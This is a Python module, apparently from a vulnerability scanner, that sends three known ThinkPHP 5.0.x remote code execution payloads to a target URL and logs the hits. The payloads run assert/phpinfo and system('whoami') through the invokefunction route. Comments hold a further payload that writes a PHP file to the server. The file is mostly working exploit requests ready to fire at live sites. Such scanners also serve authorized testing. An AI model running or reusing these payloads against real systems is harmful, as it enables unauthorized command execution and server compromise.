#! /usr/bin/python3
# -*- encoding: utf-8 -*-
import urllib3
import requests
from libs.public.outprint import OutPrintInfo
from libs.public.reqset import ReqSet

urllib3.disable_warnings()


class ThinkRCEScan7:

    def __init__(self):
        self.proxy = None
        self.timeout = None
        self.ssl = None
        self.headers = None


    def run19(self, urls):
        try:
            url = urls + '/?s=admin/\think\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][0]=phpinfo()'
            # data = "s=file_put_contents('zerosec.php','<?php phpinfo();')&_method=__construct&method=POST&filter[]=assert"
            response = requests.get(url, headers=self.headers, verify=self.ssl,timeout=self.timeout,
                                     proxies=self.proxy)
            response.encoding = response.apparent_encoding

            if "disable_functions" in response.text:
                OutPrintInfo("ThinkPHP", '[b bright_red]可能存在ThinkPHP-5.0.18-RCE-POC-2 ')
                OutPrintInfo("ThinkPHP", f"{url}\n")
                with open("./result/thinkphpRce7.txt", "a") as w:
                    w.write(f"可能存在ThinkPHP-5.0.18-RCE-POC-2 {url}\n")
            else:
                pass
                # OutPrintInfo("ThinkPHP", '不存在ThinkPHP-5.0.18-RCE-POC-2')

        except Exception:
            pass
            # OutPrintInfo("ThinkPHP", '不存在ThinkPHP-5.0.18-RCE-POC-2')
    def run20(self, urls):
        try:
            url = urls + '/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami'
            # data = "s=file_put_contents('zerosec.php','<?php phpinfo();')&_method=__construct&method=POST&filter[]=assert"
            response = requests.get(url, headers=self.headers, verify=self.ssl,timeout=self.timeout,
                                     proxies=self.proxy)
            response.encoding = response.apparent_encoding

            if response.status_code == 200 and response.url == url:
                OutPrintInfo("ThinkPHP", '[b bright_red]可能存在ThinkPHP-5.0.21-RCE-POC-1 ')
                OutPrintInfo("ThinkPHP", f"{url}\n")
                with open("./result/thinkphpRce7.txt","a") as w:
                    w.write(f"可能存在ThinkPHP-5.0.21-RCE-POC-1 {url}\n")
                # OutPrintInfo("ThinkPHP", f"SHELL {url2}")
            # OutPrintInfo("ThinkPHP", f"DATA:{data}")
            else:
                pass
                # OutPrintInfo("ThinkPHP", '不存在ThinkPHP-5.0.21-RCE-POC-1')

        except Exception:
            pass
            # OutPrintInfo("ThinkPHP", '不存在ThinkPHP-5.0.21-RCE-POC-1')
    def run21(self, urls):
        try:
            url = urls + '/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1'
            # data = "s=file_put_contents('zerosec.php','<?php phpinfo();')&_method=__construct&method=POST&filter[]=assert"
            response = requests.get(url, headers=self.headers, verify=self.ssl,timeout=self.timeout,
                                     proxies=self.proxy)
            response.encoding = response.apparent_encoding

            if response.status_code == 200 and response.url == url:
                OutPrintInfo("ThinkPHP", '[b bright_red]可能存在ThinkPHP-5.0.21-RCE-POC-2 ')
                OutPrintInfo("ThinkPHP", f"{url}\n")
                with open("./result/thinkphpRce7.txt","a") as w:
                    w.write(f"可能存在ThinkPHP-5.0.21-RCE-POC-2 {url}\n")

            else:
                pass
                # OutPrintInfo("ThinkPHP", '不存在ThinkPHP-5.0.21-RCE-POC-1')

        except Exception:
            pass
            # OutPrintInfo("ThinkPHP", '不存在ThinkPHP-5.0.21-RCE-POC-1')


    def main(self, target):
        # OutPrintInfo("ThinkPHP", '开始检测RCE...')
        url = target[0].strip('/ ')
        self.ssl = target[1]
        header = target[2]
        proxy = target[3]
        self.timeout = int(target[4])
        req = ReqSet(header=header)

        self.headers = req["header"]
        self.proxy = {"http": proxy, "https": proxy}

        self.run19(url)
        # OutPrintInfo("ThinkPHP", '开始POC-19...')
        self.run20(url)
        # OutPrintInfo("ThinkPHP", '开始POC-20...')
        self.run21(url)




        # OutPrintInfo("ThinkPHP", 'RCE检测结束')